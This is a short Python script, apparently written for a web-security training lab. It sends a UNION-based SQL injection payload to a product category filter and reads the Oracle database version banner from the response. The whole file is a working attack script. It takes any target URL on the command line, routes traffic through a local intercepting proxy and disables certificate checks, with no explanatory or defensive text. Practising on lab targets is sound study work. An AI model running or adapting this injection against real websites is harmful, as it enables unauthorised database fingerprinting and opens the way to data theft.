import requests
import urllib3
import sys
import regex as re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080'}


def exploit_payload(url):
    path = "/filter?category=Lifestyle"
    payload = "' union select banner,NULL from v$version--"
    r = requests.get(url+path+payload, verify=False, proxies=proxies)
    res = r.text
    if "Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production" in res:
        soup = BeautifulSoup(r.text, 'html.parser')
        type = soup.find(string=re.compile(".*Oracle\sDatabase.* "))
        print(f"[+] Database type and version found \n\"{type}\"")
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)
    # assuming we know the cols and its type

    if not exploit_payload(url):
        print("[-] SQL Injection Unsuccessful!")
